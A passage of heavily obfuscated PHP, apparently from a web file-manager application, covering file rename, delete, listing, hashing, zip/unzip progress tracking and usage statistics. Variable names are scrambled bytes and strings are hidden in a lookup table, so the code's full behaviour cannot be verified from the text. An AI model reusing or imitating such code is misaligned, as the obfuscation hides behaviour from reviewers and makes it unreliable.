(file_exists($½¨‘Ü˜è)) { return !1; } $ìè‘Éªû = intval(@rename($†›¢õª¿, $½¨‘Ü˜è)); $ìè‘Éªû = file_exists($½¨‘Ü˜è); return $ìè‘Éªû ? $this->getPathOuter($½¨‘Ü˜è) : !1; } public function delFile($­„»ä¦») { $­„»ä¦» = $this->iconvSystem($­„»ä¦»); if (!@unlink($­„»ä¦»)) { @chmod($­„»ä¦», $this->pathAuth); if (!@unlink($­„»ä¦»)) { return !1; } } else { return !0; } } public function delFolder($²ô… –Û) { $Ê¾¿Í‹ =& $_SERVER[ÏéâËõ‘]; $²ô… –Û = $this->iconvSystem($²ô… –Û); if (!is_dir($²ô… –Û)) { return !0; } if (!($şûú²¶š = opendir($²ô… –Û))) { return !1; } while (($¯†ãÍ¿ = readdir($şûú²¶š)) !== !1) { if ($¯†ãÍ¿ == $Ê¾¿Í‹[10] || $¯†ãÍ¿ == $Ê¾¿Í‹[1380]) { continue; } $¥Œà › = $²ô… –Û . $Ê¾¿Í‹[8] . $¯†ãÍ¿; if (is_file($¥Œà ›) || is_link($¥Œà ›)) { if (!unlink($¥Œà ›)) { chmod($¥Œà ›, $this->pathAuth); if (!unlink($¥Œà ›)) { return !1; } } } else { if (is_dir($¥Œà ›)) { chmod($¥Œà ›, $this->pathAuth); $¥Œà › = $this->iconvApp($¥Œà ›); if (!$this->delFolder($¥Œà ›)) { return !1; } } } } closedir($şûú²¶š); return rmdir($²ô… –Û); } public function rename($ùæ¦Æ„é, $îÕ˜£õç) { $°Âøî‰› =& $_SERVER[ÏéâËõ‘]; $ùí®±û = $this->fileNameAuto($this->pathFather($ùæ¦Æ„é), $îÕ˜£õç); $ùí®±û = $this->iconvSystem($ùí®±û); $ùæ¦Æ„é = $this->iconvSystem($ùæ¦Æ„é); $ñºï¯³¿ = $this->pathFather($ùæ¦Æ„é); $Î¶¿òå = rtrim($ñºï¯³¿, $°Âøî‰›[8]) . $°Âøî‰›[8] . $ùí®±û; $¿Š•éì = @rename($ùæ¦Æ„é, $Î¶¿òå); $Î¶¿òå = $this->iconvApp($Î¶¿òå); return $¿Š•éì ? $this->getPathOuter($Î¶¿òå) : !1; } public function size($‰ø¼¹ï‘) { $‰ø¼¹ï‘ = $this->iconvSystem($‰ø¼¹ï‘); return filesize_64($‰ø¼¹ï‘); } public function info($¨“ÄëâÒ) { $¨“ÄëâÒ = $this->iconvSystem($¨“ÄëâÒ); if ($this->isFolder($¨“ÄëâÒ)) { return $this->folderInfo($¨“ÄëâÒ); } else { if ($this->isFile($¨“ÄëâÒ)) { return $this->fileInfo($¨“ÄëâÒ); } } return !1; } protected function infoChildren($€ƒ£ÚÆç, &$‚¦áÎ±, $ÚÈ»¢¼ = true) { $Çß§Õ³å =& $_SERVER[ÏéâËõ‘]; check_abort_echo(); $€ƒ£ÚÆç = rtrim($€ƒ£ÚÆç, $Çß§Õ³å[8]) . $Çß§Õ³å[8]; if ($ÚÈ»¢¼) { $€ƒ£ÚÆç = $this->iconvSystem($€ƒ£ÚÆç); } if (!($ØªÆÂÊÛ = @opendir($€ƒ£ÚÆç))) { return; } while (($ÄÂ¿» = readdir($ØªÆÂÊÛ)) !== !1) { if ($ÄÂ¿» == $Çß§Õ³å[10] || $ÄÂ¿» == $Çß§Õ³å[1380]) { continue; } $ÛÜÂÖ’ = $€ƒ£ÚÆç . $ÄÂ¿»; if (is_file($ÛÜÂÖ’) || is_link($ÛÜÂÖ’)) { $‚¦áÎ±[$Çß§Õ³å[77]]++; $‚¦áÎ±[$Çß§Õ³å[76]] += filesize_64($ÛÜÂÖ’); } else { if (is_dir($ÛÜÂÖ’)) { $‚¦áÎ±[$Çß§Õ³å[78]]++; $this->infoChildren($ÛÜÂÖ’, $‚¦áÎ±, !1); } } } closedir($ØªÆÂÊÛ); } private function folderInfo($ù˜¥æ†Ø, $ ˜åĞæ = false) { $Ø¨õãß =& $_SERVER[ÏéâËõ‘]; $ù˜¥æ†Ø = rtrim($ù˜¥æ†Ø, $Ø¨õãß[8]) . $Ø¨õãß[8]; $§’ü¥È = $this->iconvApp($this->pathThis($ù˜¥æ†Ø)); if ($ ˜åĞæ) { return array($Ø¨õãß[32] => $§’ü¥È, $Ø¨õãß[84] => $this->getPathOuter($ù˜¥æ†Ø), $Ø¨õãß[33] => $Ø¨õãß[75]); } $á»×†Ò = array($Ø¨õãß[32] => $§’ü¥È, $Ø¨õãß[84] => $this->getPathOuter($ù˜¥æ†Ø), $Ø¨õãß[33] => $Ø¨õãß[75], $Ø¨õãß[200] => @filectime($ù˜¥æ†Ø), $Ø¨õãß[85] => @filemtime($ù˜¥æ†Ø), $Ø¨õãß[1383] => @fileatime($ù˜¥æ†Ø), $Ø¨õãß[1384] => is_readable($ù˜¥æ†Ø), $Ø¨õãß[1385] => is_writable($ù˜¥æ†Ø), $Ø¨õãß[1386] => get_mode($ù˜¥æ†Ø)); return $á»×†Ò; } private function fileInfo($ÙÀ›Ó, $ïĞãÍ† = false) { $ÚñÈÕäù =& $_SERVER[ÏéâËõ‘]; $±æì»·¬ = $this->iconvApp($this->pathThis($ÙÀ›Ó)); if ($ïĞãÍ†) { return array($ÚñÈÕäù[32] => $±æì»·¬, $ÚñÈÕäù[84] => $this->getPathOuter($ÙÀ›Ó), $ÚñÈÕäù[33] => $ÚñÈÕäù[199], $ÚñÈÕäù[76] => $this->size($ÙÀ›Ó), $ÚñÈÕäù[174] => $this->ext($±æì»·¬)); } $ó©Ÿ–‰Á = array($ÚñÈÕäù[32] => $±æì»·¬, $ÚñÈÕäù[84] => $this->getPathOuter($ÙÀ›Ó), $ÚñÈÕäù[33] => $ÚñÈÕäù[199], $ÚñÈÕäù[200] => @filectime($ÙÀ›Ó), $ÚñÈÕäù[85] => @filemtime($ÙÀ›Ó), $ÚñÈÕäù[1383] => @fileatime($ÙÀ›Ó), $ÚñÈÕäù[76] => $this->size($ÙÀ›Ó), $ÚñÈÕäù[174] => $this->ext($±æì»·¬), $ÚñÈÕäù[1384] => is_readable($ÙÀ›Ó), $ÚñÈÕäù[1385] => is_writable($ÙÀ›Ó), $ÚñÈÕäù[1386] => get_mode($ÙÀ›Ó)); return $ó©Ÿ–‰Á; } public function exist($Æ­ğ¿˜) { $Æ­ğ¿˜ = $this->iconvSystem($Æ­ğ¿˜); return @file_exists($Æ­ğ¿˜); } public function isFile($ØÂàƒ©Â) { $ØÂàƒ©Â = $this->iconvSystem($ØÂàƒ©Â); return @is_file($ØÂàƒ©Â); } public function isFolder($ÑÁÅş›) { $ÑÁÅş› = $this->iconvSystem($ÑÁÅş›); return @is_dir($ÑÁÅş›); } public function listPath($à¸¯¥°, $½ü‡üŠ = false) { $Ô ¹ş‘Ì =& $_SERVER[ÏéâËõ‘]; $à¸¯¥° = $this->iconvSystem($à¸¯¥°); $à¸¯¥° = rtrim($à¸¯¥°, $Ô ¹ş‘Ì[8]) . $Ô ¹ş‘Ì[8]; $ƒÄ®½øÃ = array($Ô ¹ş‘Ì[82] => array(), $Ô ¹ş‘Ì[83] => array()); if (!($òìÖ = @opendir($à¸¯¥°))) { return $ƒÄ®½øÃ; } while (($Ø”•¬ = readdir($òìÖ)) !== !1) { if ($Ø”•¬ == $Ô ¹ş‘Ì[10] || $Ø”•¬ == $Ô ¹ş‘Ì[1380]) { continue; } $¡Åç†ƒİ = $à¸¯¥° . $Ø”•¬; if (is_file($¡Åç†ƒİ)) { $ƒÄ®½øÃ[$Ô ¹ş‘Ì[83]][] = $this->fileInfo($¡Åç†ƒİ, $½ü‡üŠ); } else { $ƒÄ®½øÃ[$Ô ¹ş‘Ì[82]][] = $this->folderInfo($¡Åç†ƒİ, $½ü‡üŠ); } } closedir($òìÖ); return $ƒÄ®½øÃ; } public function listAll($Ì‡˜Ç·¬, &$‹üØùÈ = array()) { $ü°™µâ =& $_SERVER[ÏéâËõ‘]; $Ì‡˜Ç·¬ = $this->iconvSystem($Ì‡˜Ç·¬); $Ì‡˜Ç·¬ = rtrim($Ì‡˜Ç·¬, $ü°™µâ[8]) . $ü°™µâ[8]; if (!($Ê·¢¸ = @opendir($Ì‡˜Ç·¬))) { return $‹üØùÈ; } while (($’Â¯Î ı = readdir($Ê·¢¸)) !== !1) { if ($’Â¯Î ı == $ü°™µâ[10] || $’Â¯Î ı == $ü°™µâ[1380]) { continue; } $áœâÈÍÀ = $Ì‡˜Ç·¬ . $’Â¯Î ı; if (is_dir($áœâÈÍÀ) && !is_link($áœâÈÍÀ)) { $‹üØùÈ[] = array($ü°™µâ[84] => $áœâÈÍÀ . $ü°™µâ[8], $ü°™µâ[75] => 1, $ü°™µâ[85] => @filemtime($áœâÈÍÀ), $ü°™µâ[76] => 0); $this->listAll($áœâÈÍÀ, $‹üØùÈ); } else { $‹üØùÈ[] = array($ü°™µâ[84] => $áœâÈÍÀ, $ü°™µâ[75] => 0, $ü°™µâ[85] => @filemtime($áœâÈÍÀ), $ü°™µâ[76] => $this->size($áœâÈÍÀ)); } } closedir($Ê·¢¸); return $‹üØùÈ; } public function has($ÎäË›¬Ó, $ÉÇœ¥€Ö = false, $ş’‚·şŞ = true) { $àÂÓÅÕí =& $_SERVER[ÏéâËõ‘]; $ÎäË›¬Ó = $this->iconvSystem($ÎäË›¬Ó); $ÎäË›¬Ó = rtrim($ÎäË›¬Ó, $àÂÓÅÕí[8]) . $àÂÓÅÕí[8]; if (!($ùÕÓ‹åİ = @opendir($ÎäË›¬Ó))) { return !1; } $ş•Õ¦ß = 0; $‡ñ¦âĞ = 0; $ÎÚØÓû = 0; while (($™óéÁ¸© = readdir($ùÕÓ‹åİ)) !== !1) { if ($™óéÁ¸© == $àÂÓÅÕí[10] || $™óéÁ¸© == $àÂÓÅÕí[1380]) { continue; } $µÛ–Ì®¯ = $ÎäË›¬Ó . $™óéÁ¸©; if ($ÉÇœ¥€Ö) { $ÎÚØÓû++; if (@is_file($µÛ–Ì®¯)) { $ş•Õ¦ß++; } else { $‡ñ¦âĞ++; } if ($ÎÚØÓû > 10000) { break; } continue; } if ($ş’‚·şŞ) { if (@is_file($µÛ–Ì®¯)) { return !0; } } else { if (@is_dir($µÛ–Ì®¯ . $àÂÓÅÕí[8])) { return !0; } } } closedir($ùÕÓ‹åİ); if ($ÉÇœ¥€Ö) { return array($àÂÓÅÕí[207] => $ş•Õ¦ß, $àÂÓÅÕí[208] => $‡ñ¦âĞ); } return !1; } public function hashSimple($ª®Ï§‚ö) { $àšÃ–ê =& $_SERVER[ÏéâËõ‘]; if (!$ª®Ï§‚ö) { return md5($àšÃ–ê[12]); } $ª®Ï§‚ö = $this->iconvSystem($ª®Ï§‚ö); $Ñ¡íÀøÁ = $this->size($ª®Ï§‚ö); $Ó¥Ü‹ºÜ = 200; $ê¼ıŠÊ = 50; if ($Ñ¡íÀøÁ <= $Ó¥Ü‹ºÜ * $ê¼ıŠÊ) { return $this->hashMd5($ª®Ï§‚ö) . $Ñ¡íÀøÁ; } $ÀŠÄÙÔ = $àšÃ–ê[12]; $÷—ÀÔœå = intval($Ñ¡íÀøÁ / $ê¼ıŠÊ); $ğÄ„“¶Œ = fopen($ª®Ï§‚ö, $àšÃ–ê[1387]); if (!$ğÄ„“¶Œ) { return $ÀŠÄÙÔ; } for ($°ø²¢Ş… = 0; $°ø²¢Ş… < $ê¼ıŠÊ; $°ø²¢Ş…++) { fseek_64($ğÄ„“¶Œ, $÷—ÀÔœå * $°ø²¢Ş…); $ÀŠÄÙÔ .= fread($ğÄ„“¶Œ, $Ó¥Ü‹ºÜ); } fseek_64($ğÄ„“¶Œ, $Ñ¡íÀøÁ - $Ó¥Ü‹ºÜ); $ÀŠÄÙÔ .= fread($ğÄ„“¶Œ, $Ó¥Ü‹ºÜ); fclose($ğÄ„“¶Œ); return md5($ÀŠÄÙÔ) . $Ñ¡íÀøÁ; } public function getContent($¬…ˆãµÑ) { $¬…ˆãµÑ = $this->iconvSystem($¬…ˆãµÑ); return file_get_contents($¬…ˆãµÑ); } public function setContent($½Ş›«Á‹, $¼‡˜õÑ = '') { $½Ş›«Á‹ = $this->iconvSystem($½Ş›«Á‹); $ÚÑ¶ÀÀ© = @file_put_contents($½Ş›«Á‹, $¼‡˜õÑ, LOCK_EX); clearstatcache(); @chmod($½Ş›«Á‹, $this->pathAuth); return $ÚÑ¶ÀÀ© === !1 ? !1 : !0; } public function fileSubstr($úù­™‚ğ, $ÊîŸ£âÈ = 0, $ƒãÄ¾– = false) { $Ÿì¤©ïï =& $_SERVER[ÏéâËõ‘]; $úù­™‚ğ = $this->iconvSystem($úù­™‚ğ); if ($ƒãÄ¾– === !1) { $ƒãÄ¾– = $this->size($úù­™‚ğ); } if ($ƒãÄ¾– <= 0) { return $Ÿì¤©ïï[12]; } $†¾ù¤É‡ = fopen($úù­™‚ğ, $Ÿì¤©ïï[1387]); if (!$†¾ù¤É‡) { return !1; } fseek_64($†¾ù¤É‡, $ÊîŸ£âÈ); $·†üŞûĞ = fread($†¾ù¤É‡, $ƒãÄ¾–); fclose($†¾ù¤É‡); return $·†üŞûĞ; } public function upload($øÊ¸ï–Æ, $ÏˆïÜó”, $Í³…ê¿‚ = false, $‹ùóÛ¿ = REPEAT_REPLACE) { if ($Í³…ê¿‚) { return $this->moveFile($ÏˆïÜó”, $øÊ¸ï–Æ); } return $this->copyFile($ÏˆïÜó”, $øÊ¸ï–Æ); } public function setModifyTime($¯·ÙƒÆú, $è´¨ÃÂ¨ = '') { @touch($¯·ÙƒÆú, intval($è´¨ÃÂ¨)); } public function download($œ“ËÏ‚¿, $ÛÚß¼©Â) { return $this->iconvSystem($œ“ËÏ‚¿); } } goto BØ›ŠõØŞ¡; AÕ©”î­¸Ÿ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $Ô±§Ñ¨… =& $_SERVER[ÏéâËõ‘]; parent::startAfter(); Hook::bind($Ô±§Ñ¨…[1755], array($this, $Ô±§Ñ¨…[1756])); Hook::bind($Ô±§Ñ¨…[1199], array($this, $Ô±§Ñ¨…[1757])); $ÒŒ»é” =& $this->task; $ÒŒ»é”[$Ô±§Ñ¨…[1758]] = $Ô±§Ñ¨…[1204]; if (!$ÒŒ»é”[$Ô±§Ñ¨…[1561]]) { $ÒŒ»é”[$Ô±§Ñ¨…[1561]] = LNG($Ô±§Ñ¨…[1759]); } } protected function endAfter() { $İ¤Ö«÷‹ =& $_SERVER[ÏéâËõ‘]; parent::endAfter(); Hook::unbind($İ¤Ö«÷‹[1755], array($this, $İ¤Ö«÷‹[1756])); Hook::unbind($İ¤Ö«÷‹[1199], array($this, $İ¤Ö«÷‹[1757])); } public function updateAfter() { $ñíİ’ãü =& $_SERVER[ÏéâËõ‘]; $»Øëò‚Ü =& $this->task; if (!$»Øëò‚Ü[$ñíİ’ãü[788]] || !$»Øëò‚Ü[$ñíİ’ãü[765]]) { return; } if ($»Øëò‚Ü[$ñíİ’ãü[1758]] == $ñíİ’ãü[1204]) { $ºóäéÎ× = 0; if ($»Øëò‚Ü[$ñíİ’ãü[1713]]) { $ºóäéÎ× = $»Øëò‚Ü[$ñíİ’ãü[1714]] / $»Øëò‚Ü[$ñíİ’ãü[1713]]; } $»Øëò‚Ü[$ñíİ’ãü[1664]] = $ºóäéÎ× * 0.3; } else { if ($»Øëò‚Ü[$ñíİ’ãü[1758]] == $ñíİ’ãü[313]) { $ºóäéÎ× = $»Øëò‚Ü[$ñíİ’ãü[1663]] / $»Øëò‚Ü[$ñíİ’ãü[788]]; $»Øëò‚Ü[$ñíİ’ãü[1664]] = 0.3 + $ºóäéÎ× * 0.4; } else { if ($»Øëò‚Ü[$ñíİ’ãü[1758]] == $ñíİ’ãü[107]) { $©å÷áÍ‰ = 0; if ($»Øëò‚Ü[$ñíİ’ãü[1715]] == $ñíİ’ãü[107]) { $©å÷áÍ‰ = $»Øëò‚Ü[$ñíİ’ãü[1714]]; } $ºóäéÎ× = ($»Øëò‚Ü[$ñíİ’ãü[1718]] + $©å÷áÍ‰) / $»Øëò‚Ü[$ñíİ’ãü[765]]; $»Øëò‚Ü[$ñíİ’ãü[1664]] = 0.3 + 0.4 + $ºóäéÎ× * 0.3; } } } if ($»Øëò‚Ü[$ñíİ’ãü[1664]] > 0) { $¨üâ‚½ = timeFloat() - $»Øëò‚Ü[$ñíİ’ãü[1666]] - $»Øëò‚Ü[$ñíİ’ãü[1669]]; $»Øëò‚Ü[$ñíİ’ãü[1670]] = $¨üâ‚½ * (1 - $»Øëò‚Ü[$ñíİ’ãü[1664]]) / $»Øëò‚Ü[$ñíİ’ãü[1664]]; } } public function addFile($ğ°Úø) { $ßèş—£î =& $_SERVER[ÏéâËõ‘]; $Ÿ¥†¬Şİ =& $this->task; $ìÔïéê = IO::info($ğ°Úø); $Ÿ¥†¬Şİ[$ßèş—£î[1711]] = $ìÔïéê[$ßèş—£î[32]]; $Ÿ¥†¬Şİ[$ßèş—£î[1713]] = $ìÔïéê[$ßèş—£î[76]]; $Ÿ¥†¬Şİ[$ßèş—£î[1714]] = 0; $Ÿ¥†¬Şİ[$ßèş—£î[1069]] = $ßèş—£î[1734]; $Ÿ¥†¬Şİ[$ßèş—£î[1715]] = $ßèş—£î[1204]; $Ÿ¥†¬Şİ[$ßèş—£î[765]] = $ìÔïéê[$ßèş—£î[76]]; $Ÿ¥†¬Şİ[$ßèş—£î[788]] = 1; $…öŠÕ„¦ = 0; $Ÿ¥†¬Şİ[$ßèş—£î[1722]] = array($ßèş—£î[1723] => $…öŠÕ„¦ + 1, $ßèş—£î[420] => $ìÔïéê[$ßèş—£î[32]], $ßèş—£î[84] => $ìÔïéê[$ßèş—£î[84]], $ßèş—£î[519] => $ìÔïéê[$ßèş—£î[519]] ? $ìÔïéê[$ßèş—£î[519]] : $ìÔïéê[$ßèş—£î[84]]); $this->update(); } public function unzipAfter($£Ö±çşÏ) { $Ğçøş³— =& $_SERVER[ÏéâËõ‘]; $ÇŞöäÈ =& $this->task; $ÇŞöäÈ[$Ğçøş³—[1758]] = $Ğçøş³—[107]; $Û½¯‘ì‡ = IO::infoWithChildren($£Ö±çşÏ); $È±Œ­•Ü = 0; $ÇŞöäÈ[$Ğçøş³—[1722]] = array($Ğçøş³—[1723] => $È±Œ­•Ü + 1, $Ğçøş³—[420] => $Û½¯‘ì‡[$Ğçøş³—[32]], $Ğçøş³—[84] => $Û½¯‘ì‡[$Ğçøş³—[84]], $Ğçøş³—[519] => $Û½¯‘ì‡[$Ğçøş³—[519]] ? $Û½¯‘ì‡[$Ğçøş³—[519]] : $Û½¯‘ì‡[$Ğçøş³—[84]]); if ($Û½¯‘ì‡[$Ğçøş³—[33]] == $Ğçøş³—[199]) { $ÇŞöäÈ[$Ğçøş³—[788]] = 1; } else { $ÇŞöäÈ[$Ğçøş³—[788]] = $Û½¯‘ì‡[$Ğçøş³—[79]][$Ğçøş³—[77]]; } $ÇŞöäÈ[$Ğçøş³—[1069]] = $Ğçøş³—[12]; $ÇŞöäÈ[$Ğçøş³—[1715]] = 0; $ÇŞöäÈ[$Ğçøş³—[1663]] = 0; $ÇŞöäÈ[$Ğçøş³—[1713]] = 0; $ÇŞöäÈ[$Ğçøş³—[1714]] = 0; $ÇŞöäÈ[$Ğçøş³—[1711]] = $Ğçøş³—[12]; $ÇŞöäÈ[$Ğçøş³—[1718]] = 0; $ÇŞöäÈ[$Ğçøş³—[765]] = $Û½¯‘ì‡[$Ğçøş³—[76]]; $this->update(); self::log($Ğçøş³—[1760] . json_encode(array($ÇŞöäÈ, $Û½¯‘ì‡))); } public function nameParse($Éö¦Ë©ê) { $Ÿ›éÛÌÊ =& $_SERVER[ÏéâËõ‘]; $ò“ÓèÇô =& $this->task; if ($ò“ÓèÇô[$Ÿ›éÛÌÊ[1758]] == $Ÿ›éÛÌÊ[1204]) { $ò“ÓèÇô[$Ÿ›éÛÌÊ[1758]] = $Ÿ›éÛÌÊ[313]; $ò“ÓèÇô[$Ÿ›éÛÌÊ[1718]] = 0; $ò“ÓèÇô[$Ÿ›éÛÌÊ[765]] = 0; } $í¼›¹‹ = get_path_this($Éö¦Ë©ê); if (strstr($í¼›¹‹, $Ÿ›éÛÌÊ[10])) { $ò“ÓèÇô[$Ÿ›éÛÌÊ[1663]] += 1; $ò“ÓèÇô[$Ÿ›éÛÌÊ[788]] += 1; } $ò“ÓèÇô[$Ÿ›éÛÌÊ[1711]] = $Éö¦Ë©ê; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ÀØ‚«¤ò =& $_SERVER[ÏéâËõ‘]; parent::startAfter(); Hook::bind($ÀØ‚«¤ò[1761], array($this, $ÀØ‚«¤ò[1756])); $²¤²ÁÛÃ =& $this->task; $²¤²ÁÛÃ[$ÀØ‚«¤ò[1758]] = $ÀØ‚«¤ò[1204]; if (!$²¤²ÁÛÃ[$ÀØ‚«¤ò[1561]]) { $²¤²ÁÛÃ[$ÀØ‚«¤ò[1561]] = LNG($ÀØ‚«¤ò[1762]); } } protected function endAfter() { $ı¥¡‹¸Î =& $_SERVER[ÏéâËõ‘]; parent::endAfter(); Hook::unbind($ı¥¡‹¸Î[1761], array($this, $ı¥¡‹¸Î[1756])); } public function updateAfter() { $‹¸Œ³…¯ =& $_SERVER[ÏéâËõ‘]; $ÏÒ½×€õ =& $this->task; if (!$ÏÒ½×€õ[$‹¸Œ³…¯[788]] || !$ÏÒ½×€õ[$‹¸Œ³…¯[765]]) { return; } if ($ÏÒ½×€õ[$‹¸Œ³…¯[1758]] == $‹¸Œ³…¯[1204]) { $™øË’º = $ÏÒ½×€õ[$‹¸Œ³…¯[1714]]; if ($ÏÒ½×€õ[$‹¸Œ³…¯[1715]] != $‹¸Œ³…¯[1204]) { $™øË’º = 0; } $€½ÊîŸô = ($ÏÒ½×€õ[$‹¸Œ³…¯[1718]] + $™øË’º) / $ÏÒ½×€õ[$‹¸Œ³…¯[765]]; $ÏÒ½×€õ[$‹¸Œ³…¯[1664]] = $€½ÊîŸô * 0.3; } else { if ($ÏÒ½×€õ[$‹¸Œ³…¯[1758]] == $‹¸Œ³…¯[313]) { $€½ÊîŸô = $ÏÒ½×€õ[$‹¸Œ³…¯[1663]] / $ÏÒ½×€õ[$‹¸Œ³…¯[788]]; $ÏÒ½×€õ[$‹¸Œ³…¯[1664]] = 0.3 + $€½ÊîŸô * 0.5; } else { if ($ÏÒ½×€õ[$‹¸Œ³…¯[1758]] == $‹¸Œ³…¯[107]) { $€½ÊîŸô = 0; if ($ÏÒ½×€õ[$‹¸Œ³…¯[1713]]) { $€½ÊîŸô = $ÏÒ½×€õ[$‹¸Œ³…¯[1714]] / $ÏÒ½×€õ[$‹¸Œ³…¯[1713]]; } $ÏÒ½×€õ[$‹¸Œ³…¯[1664]] = 0.3 + 0.5 + $€½ÊîŸô * 0.2; } } } if ($ÏÒ½×€õ[$‹¸Œ³…¯[1664]] > 0) { $†‰Š˜¾ù = timeFloat() - $ÏÒ½×€õ[$‹¸Œ³…¯[1666]] - $ÏÒ½×€õ[$‹¸Œ³…¯[1669]]; $ÏÒ½×€õ[$‹¸Œ³…¯[1670]] = $†‰Š˜¾ù * (1 - $ÏÒ½×€õ[$‹¸Œ³…¯[1664]]) / $ÏÒ½×€õ[$‹¸Œ³…¯[1664]]; } } public function copyFileStart($š·şƒ½‡, $‚ÙÚ ç¹, $çòŠ³¡¼, $¿Ø±í•, $†Â©Æß, $Ï›Ê„—) { $ÕÇÓ‡­ =& $_SERVER[ÏéâËõ‘]; parent::copyFileStart($š·şƒ½‡, $‚ÙÚ ç¹, $çòŠ³¡¼, $¿Ø±í•, $†Â©Æß, $Ï›Ê„—); $²ğ©‡µ× =& $this->task; if ($²ğ©‡µ×[$ÕÇÓ‡­[1758]] == $ÕÇÓ‡­[313]) { $²ğ©‡µ×[$ÕÇÓ‡­[1758]] = $ÕÇÓ‡­[107]; } $this->update(); } public function copyFileEnd($‰´Ò…î¯, $¹Ëø´›š, $¯á€şÌÃ, $À—ä¢«ø, $à©±†ÒÊ, $şÚƒ²ğè) { $Ÿ‹‰ë™ï =& $_SERVER[ÏéâËõ‘]; $Š¤¤¯ =& $this->task; $Š¤¤¯[$Ÿ‹‰ë™ï[1714]] = $Š¤¤¯[$Ÿ‹‰ë™ï[1713]]; $Š¤¤¯[$Ÿ‹‰ë™ï[1718]] += $Š¤¤¯[$Ÿ‹‰ë™ï[1713]]; $Š¤¤¯[$Ÿ‹‰ë™ï[1715]] = $Ÿ‹‰ë™ï[12]; $this->update(); } public function nameParse($ Ê©§¨Ô) { $¦¨×ì«¡ =& $_SERVER[ÏéâËõ‘]; $–¯ç¼Ö =& $this->task; if ($–¯ç¼Ö[$¦¨×ì«¡[1663]] < $–¯ç¼Ö[$¦¨×ì«¡[788]]) { $Ç”Íãö = get_path_this($ Ê©§¨Ô); if (strstr($Ç”Íãö, $¦¨×ì«¡[10])) { $–¯ç¼Ö[$¦¨×ì«¡[1663]] += 1; } } if ($–¯ç¼Ö[$¦¨×ì«¡[1758]] == $¦¨×ì«¡[1204]) { $–¯ç¼Ö[$¦¨×ì«¡[1758]] = $¦¨×ì«¡[313]; } $–¯ç¼Ö[$¦¨×ì«¡[1711]] = $ Ê©§¨Ô; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($áÓ›¥€±) { $Ã±€¤¦ï =& $_SERVER[ÏéâËõ‘]; $ğĞÇÄÁŒ = array($Ã±€¤¦ï[600] => array($Ã±€¤¦ï[33] => $Ã±€¤¦ï[1763], $Ã±€¤¦ï[273] => array($Ã±€¤¦ï[224], $Ã±€¤¦ï[767], $Ã±€¤¦ï[1764], $Ã±€¤¦ï[1765])), $Ã±€¤¦ï[1766] => array($Ã±€¤¦ï[33] => $Ã±€¤¦ï[1767], $Ã±€¤¦ï[273] => array($Ã±€¤¦ï[224], $Ã±€¤¦ï[765], $Ã±€¤¦ï[1768], $Ã±€¤¦ï[1769], $Ã±€¤¦ï[1770]))); if (!isset($ğĞÇÄÁŒ[$áÓ›¥€±])) { return !1; } $this->optionType = $ğĞÇÄÁŒ[$áÓ›¥€±][$Ã±€¤¦ï[33]]; $this->field = $ğĞÇÄÁŒ[$áÓ›¥€±][$Ã±€¤¦ï[273]]; return !0; } public function listData($¬óİ—°ı = false, $ÙÀ¿ˆ = "\x6d\157\x64\151\x66\x79\x54\x69\x6d\145", $‚¸âíÀ¥ = false) { return parent::listData($¬óİ—°ı, $ÙÀ¿ˆ, $‚¸âíÀ¥); } public function trendList($¼¾‘˜¤–) { $Ø´š€à =& $_SERVER[ÏéâËõ‘]; $´ãååÃ¤ = $this->listData(); if ($´ãååÃ¤) { $‘ıÂÊİ‘ = end($´ãååÃ¤); $Í¾ñ×¹ê = date($Ø´š€à[1771], strtotime($Ø´š€à[1772])); if ($‘ıÂÊİ‘[$Ø´š€à[224]] == $Í¾ñ×¹ê) { return $´ãååÃ¤; } $èıÙ¾Û = strtotime($‘ıÂÊİ‘[$Ø´š€à[224]]); } if (!isset($èıÙ¾Û)) { $Î·à»ÒÛ = $¼¾‘˜¤– == $Ø´š€à[600] ? $Ø´š€à[535] : $Ø´š€à[827]; $èıÙ¾Û = Model($Î·à»ÒÛ)->min($Ø´š€à[200]); } $šá°“Ü = $Ø´š€à[1773] . ucfirst($¼¾‘˜¤–); $‘éƒ—÷Ş = $this->dateList($èıÙ¾Û); foreach ($‘éƒ—÷Ş as $Í¾ñ×¹ê) { $this->{$šá°“Ü}($Í¾ñ×¹ê); } return $this->listData(); } private function dateList($áŒêé‡ã) { $Úü¿†İÃ =& $_SERVER[ÏéâËõ‘]; $¶ÒÁ¾×¥ = $áŒêé‡ã; $´›Ì¡° = strtotime($Úü¿†İÃ[1772]); $ö¼ÂÇ–£ = array(); while ($¶ÒÁ¾×¥ <= $´›Ì¡°) { $ö¼ÂÇ–£[] = date($Úü¿†İÃ[1771], $¶ÒÁ¾×¥); $¶ÒÁ¾×¥ = strtotime($Úü¿†İÃ[1774], $¶ÒÁ¾×¥); } return $ö¼ÂÇ–£; } public function _recordUser($ÚÅ¯‚¼ = '') { $åÆ÷öÃâ =& $_SERVER[ÏéâËõ‘]; $ÂùŞ°¹Ô = strtotime(date($åÆ÷öÃâ[1775], strtotime($ÚÅ¯‚¼))); $êÂô»¼ = strtotime(date($åÆ÷öÃâ[1776], strtotime($ÚÅ¯‚¼))); $ø³úÅÛé = array($åÆ÷öÃâ[200] => array($åÆ÷öÃâ[1018], $êÂô»¼)); $–Á…åš§ = Model($åÆ÷öÃâ[535])->where($ø³úÅÛé)->count($åÆ÷öÃâ[1662]); $ø³úÅÛé[$åÆ÷öÃâ[200]] = array($åÆ÷öÃâ[333], array($ÂùŞ°¹Ô, $êÂô»¼)); $ôá¢¶àÚ = Model($åÆ÷öÃâ[535])->where($ø³úÅÛé)->count($åÆ÷öÃâ[1662]); $ø³úÅÛé[$åÆ÷öÃâ[33]] = $åÆ÷öÃâ[1777]; $Âß™ĞÃ = Model($åÆ÷öÃâ[1778])->where($ø³úÅÛé)->count($åÆ÷öÃâ[1779]); $ÔÇ«Ë²â = array($åÆ÷öÃâ[224] => $ÚÅ¯‚¼, $åÆ÷öÃâ[767] => (int) $–Á…åš§, $åÆ÷öÃâ[1764] => (int) $ôá¢¶àÚ, $åÆ÷öÃâ[1765] => (int) $Âß™ĞÃ); return $this->insert($ÔÇ«Ë²â); } public function _recordStore($¢öÜù‚È = '') { $ÙæÑËÛ =& $_SERVER[ÏéâËõ‘]; $÷êÅ©Ö = strtotime(date($ÙæÑËÛ[1776], strtotime($¢öÜù‚È))); $“€×âÕ½ = array($ÙæÑËÛ[200] => array($ÙæÑËÛ[1018], $÷êÅ©Ö)); $ÙÍúØÔƒ = 